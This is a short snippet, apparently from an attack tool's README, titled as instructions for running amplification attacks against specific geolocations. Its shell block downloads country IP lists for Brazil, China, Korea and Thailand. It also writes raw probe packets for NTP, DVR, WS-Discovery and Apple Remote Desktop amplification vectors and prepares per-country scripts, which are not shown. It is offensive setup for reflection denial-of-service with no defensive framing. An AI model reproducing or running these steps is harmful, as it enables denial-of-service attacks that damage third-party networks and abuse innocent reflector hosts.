Do amplification attacks with specific geolocations

```shell
wget https://www.ipdeny.com/ipblocks/data/countries/br.zone
wget https://www.ipdeny.com/ipblocks/data/countries/cn.zone
wget https://www.ipdeny.com/ipblocks/data/countries/kr.zone
wget https://www.ipdeny.com/ipblocks/data/countries/th.zone

echo -ne "\x17\x00\x03\x2a\x00\x00\x00\x00" > ntp.pkt
echo -ne "\x44\x48\x49\x50" > dvr.pkt
echo -ne "<:>" > wsd.pkt
echo -ne "\x00\x14\x00\x00" > ard.pkt

apt install dos2unix -y
dos2unix br.sh
dos2unix kr.sh
dos2unix cn.sh
dos2unix th.sh
```
